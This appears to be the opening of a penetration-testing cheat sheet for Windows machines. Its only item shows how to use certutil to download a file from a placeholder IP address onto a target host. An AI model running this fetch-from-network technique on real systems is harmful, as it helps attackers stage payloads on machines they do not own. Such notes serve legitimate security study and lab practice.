# Commands & Techniques useful in Windows boxes. 

1. **File Transfer**

We can utilize certutil for this

```
certutil -urlcache -f http://<IP Address>/<file name> saved_file

	-- where saved_file is the name of the file you want to save it as
```

